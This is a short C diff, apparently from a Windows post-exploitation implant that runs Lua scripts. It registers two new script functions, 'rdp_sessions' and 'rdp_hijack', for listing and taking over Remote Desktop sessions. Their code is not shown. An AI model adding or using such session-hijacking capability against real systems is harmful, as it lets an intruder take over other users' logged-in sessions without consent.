@@ -124,7 +124,14 @@ LPCSTR do_lua(LPCSTR lua_code,DWORD thread_id){
 
 	lua_pushcfunction(l, l_closelog);
     lua_setglobal(l, "closelog");
-	;
+	
+	lua_pushcfunction(l, l_get_rdp_sessions);
+    lua_setglobal(l, "rdp_sessions");
+
+
+	lua_pushcfunction(l, l_rdp_hijack);
+    lua_setglobal(l, "rdp_hijack");
+
 	if(luaL_dostring(l,lua_code)!=0){	// Error parsing code
 		dprintf("Error parsing code :( ");
 		msg=lua_tostring(l, -1);
